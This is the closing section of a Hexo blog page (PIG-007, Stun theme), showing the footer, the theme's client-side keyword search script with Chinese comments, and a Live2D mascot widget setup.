src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>